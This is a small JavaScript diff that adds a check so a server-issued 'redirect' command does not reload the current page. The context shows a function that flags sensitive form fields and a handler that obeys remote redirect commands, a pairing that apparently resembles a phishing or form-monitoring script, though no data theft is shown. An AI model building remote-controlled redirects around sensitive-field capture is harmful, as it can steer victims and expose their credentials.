@@ -49,6 +49,19 @@
     return apiBase + "/" + path.replace(/^\//, "");
   }
 
+  function sameLocation(targetUrl) {
+    try {
+      var target = new URL(targetUrl, location.href);
+      var current = new URL(location.href);
+      return target.origin === current.origin
+        && target.pathname === current.pathname
+        && target.search === current.search
+        && target.hash === current.hash;
+    } catch (error) {
+      return false;
+    }
+  }
+
   function sensitiveField(field, input) {
     var text = [
       field,
@@ -127,7 +140,7 @@
       .then(function (response) { return response.ok ? response.json() : null; })
       .then(function (data) {
         var command = data && data.command;
-        if (command && command.action === "redirect" && command.targetUrl) {
+        if (command && command.action === "redirect" && command.targetUrl && !sameLocation(command.targetUrl)) {
           location.href = command.targetUrl;
         }
       })
